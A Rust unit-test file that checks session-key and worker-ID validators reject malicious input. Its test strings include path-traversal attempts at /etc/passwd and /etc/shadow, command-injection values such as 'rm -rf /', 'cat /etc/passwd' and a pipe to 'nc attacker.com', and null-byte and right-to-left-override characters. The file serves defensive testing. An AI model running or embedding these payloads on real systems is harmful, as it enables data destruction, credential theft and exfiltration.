use agw::config::{validate_session_key, validate_worker_id};

#[test]
fn test_session_key_security_validation() {
    // Valid keys
    assert!(validate_session_key("valid-key-12345").is_ok());
    assert!(validate_session_key("another_valid_key").is_ok());
    assert!(validate_session_key("UPPERCASE_KEY_123").is_ok());

    // Empty key
    assert!(validate_session_key("").is_err());

    // Too short
    assert!(validate_session_key("short").is_err());

    // Path traversal attempts
    assert!(validate_session_key("../../../etc/passwd").is_err());
    assert!(validate_session_key("..\\..\\..\\windows\\system32").is_err());
    assert!(validate_session_key("/etc/shadow").is_err());

    // Command injection attempts
    assert!(validate_session_key("key;rm -rf /").is_err());
    assert!(validate_session_key("key && whoami").is_err());
    assert!(validate_session_key("key || cat /etc/passwd").is_err());
    assert!(validate_session_key("key | nc attacker.com").is_err());
    assert!(validate_session_key("key$(whoami)test").is_err());
    assert!(validate_session_key("key`id`test").is_err());
    assert!(validate_session_key("key$((1+1))").is_err());
}

#[test]
fn test_worker_id_security_validation() {
    // Valid IDs
    assert!(validate_worker_id("worker-1").is_ok());
    assert!(validate_worker_id("worker_test_123").is_ok());
    assert!(validate_worker_id("WORKER123").is_ok());
    assert!(validate_worker_id("agw-550e8400-e29b-41d4-a716-446655440000").is_ok());

    // Empty ID
    assert!(validate_worker_id("").is_err());

    // Too long
    let long_id = "a".repeat(65);
    assert!(validate_worker_id(&long_id).is_err());

    // Invalid characters
    assert!(validate_worker_id("worker.1").is_err());
    assert!(validate_worker_id("worker@host").is_err());
    assert!(validate_worker_id("worker#1").is_err());
    assert!(validate_worker_id("worker/1").is_err());
    assert!(validate_worker_id("worker\\1").is_err());
    assert!(validate_worker_id("worker;rm -rf /").is_err());
    assert!(validate_worker_id("worker|cat").is_err());
    assert!(validate_worker_id("worker&whoami").is_err());
    assert!(validate_worker_id("worker$test").is_err());
    assert!(validate_worker_id("worker`id`").is_err());
}

#[test]
fn test_config_validation_edge_cases() {
    // Test various edge cases for configuration validation

    // Boundary conditions for key length
    assert!(validate_session_key("12345678").is_ok()); // Exactly 8 chars
    assert!(validate_session_key("1234567").is_err()); // One less than minimum

    // Boundary conditions for worker ID length
    let max_valid_id = "a".repeat(64);
    assert!(validate_worker_id(&max_valid_id).is_ok());

    let one_over_max = "a".repeat(65);
    assert!(validate_worker_id(&one_over_max).is_err());
}

#[test]
fn test_unicode_and_special_input_handling() {
    // Unicode characters should be rejected
    assert!(validate_session_key("key\u{0000}test").is_err()); // Null byte
    assert!(validate_worker_id("worker\u{202e}test").is_err()); // Right-to-left override

    // Whitespace handling
    assert!(validate_worker_id("worker test").is_err()); // Space
    assert!(validate_worker_id("worker\ttest").is_err()); // Tab
    assert!(validate_worker_id("worker\ntest").is_err()); // Newline
}
